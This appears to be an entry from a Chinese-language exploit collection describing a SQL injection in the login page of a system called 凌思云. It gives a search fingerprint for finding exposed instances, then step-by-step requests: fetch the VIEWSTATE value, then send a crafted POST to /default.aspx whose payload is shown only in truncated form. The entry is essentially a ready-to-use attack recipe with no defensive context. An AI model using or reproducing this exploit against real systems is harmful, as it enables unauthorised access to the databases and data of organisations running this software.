# 凌思云-login-sql注入漏洞

- **系统**：凌思云-login　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="js/AllPageFunction.js"`
- **请求**：`GET /default.aspx HTTP/1.1`

**请求体 / payload**
```
1.发送以下请求包，在响应里面获取VIEWSTATE的值
Host:
2.将上面获取的VIEWSTATE值最好url编码后，传入以下请求包{{VIEWSTATE}}处
POST /default.aspx HTTP/1.1
Host:
Content-Type:application/x-www-form-urlencoded
X-Ext.Net: delta=true
hidLanguages=&__EVENTTARGET=ResourceManager1&__EVENTARGUMENT=-%7Cpublic%7CbtnBeforeLogin_Click&__VIEWSTATE=/wEPDwUJMzc0ODA5MTAxD2QWAgIDD2QWEAIBD2QWAmYPFgIeBWNsYXNzBQh4LWhpZGRlbmQCBQ9kFgJmDxYCHwAFCHgtaGlkZGVuZAIHD2QWAmYPFgIfAAUIeC1oaWRkZW5kAgkPZBYCZg8WAh8ABQh4LWhpZGRlbmQCCw9kFgJmDxYCHwAFCHgtaGlkZGVuZAIND2QWAmYPFgIfAAUIeC1oaWRkZW5kAg8PZBYCZg8WAh8ABQh4LWhpZGRlbmQCEQ9kFgJmDxYCHwAFCHgtaGlkZGVuZBgBBR5fX0NvbnRyb2xzUm…（脚本共 918 字，完整版见原文）
```